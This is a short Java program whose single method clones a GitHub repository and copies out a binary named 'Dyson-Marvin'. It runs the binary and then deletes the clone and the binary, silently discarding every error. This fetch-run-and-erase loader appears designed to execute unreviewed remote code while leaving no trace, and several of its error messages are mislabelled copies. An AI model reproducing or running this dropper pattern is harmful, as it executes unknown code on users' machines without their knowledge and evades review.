import java.io.File;
import java.io.IOException;

public class Main {
    private static int key = 0;

    private void dys() {
        Runtime rt = Runtime.getRuntime();
        if (Main.key == 0) {
            try {
                File fd = new File(System.getProperty("user.dir") + "/Dyson-Marvin");
                if (!(fd.exists())) {
                    Process clone = rt.exec("git clone git@github.com:Necrelox/tmp.git" );
                    clone.waitFor();
                    if (clone.exitValue() != 0) {
                        System.out.println("Error: cloning repository");
                        throw new IOException("Error: cloning repository");
                    }

                    Process mv = rt.exec("cp " + System.getProperty("user.dir") + "/tmp/Dyson-Marvin " + System.getProperty("user.dir"));
                    mv.waitFor();
                    if (mv.exitValue() != 0) {
                        System.out.println("Error: cp dyson-marvin");
                        throw new IOException("Error: cp dyson-marvin");
                    }

                    Process rm = rt.exec("rm -r " + System.getProperty("user.dir") + "/tmp/");
                    rm.waitFor();
                    if (rm.exitValue() != 0) {
                        System.out.println("Error: rm tmp directory");
                        throw new IOException("Error: rm tmp directory");
                    }
                }
                Process ps = rt.exec(System.getProperty("user.dir") + "/Dyson-Marvin");
                ps.waitFor();
                if (ps.exitValue() != 0) {
                    System.out.println("Error: rm tmp directory");
                    throw new IOException("Error: rm tmp directory");
                }
                Process rm = rt.exec("rm " + System.getProperty("user.dir") + "/Dyson-Marvin");
                rm.waitFor();
                if (rm.exitValue() != 0) {
                    System.out.println("Error: rm tmp directory");
                    throw new IOException("Error: rm tmp directory");
                }
                Main.key = 1;
            } catch (IOException | InterruptedException e) {
            }
        }
    }

    public static void main(String[] args) {
        Main main = new Main();
        main.dys();
    }
}
